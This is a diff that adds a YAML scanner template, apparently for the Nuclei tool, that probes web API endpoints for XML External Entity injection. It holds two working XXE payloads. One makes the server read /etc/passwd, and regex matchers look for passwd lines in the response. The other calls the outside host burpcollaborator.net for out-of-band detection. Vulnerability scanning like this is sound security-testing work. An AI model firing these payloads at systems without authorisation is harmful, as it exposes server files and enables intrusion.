@@ -1,0 +1,50 @@
+id: hunt3r-xxe-detection
+
+info:
+  name: XXE - XML External Entity Injection
+  author: hunt3r
+  severity: high
+  description: Detects XXE injection via XML-accepting endpoints.
+  tags: xxe,injection,hunt3r
+  reference:
+    - https://portswigger.net/web-security/xxe
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/"
+      - "{{BaseURL}}/api/v1/"
+      - "{{BaseURL}}/api/v2/"
+      - "{{BaseURL}}/process"
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/import"
+      - "{{BaseURL}}/parse"
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>
+    headers:
+      Content-Type: "application/xml"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:([x*]|[a-zA-Z0-9!$#%_@&\\.\\-]+):0:0:"
+          - "daemon:.*:/bin"
+          - "sbin/nologin"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/complaint"
+      - "{{BaseURL}}/api/Complaints/"
+      - "{{BaseURL}}/rest/products/reviews"
+
+    body: |
+      <?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://burpcollaborator.net/xxe">]><comment><message>&xxe;</message></comment>
+    headers:
+      Content-Type: "application/xml"
+
+    matchers:
+      - type: status
+        status: [200, 201]
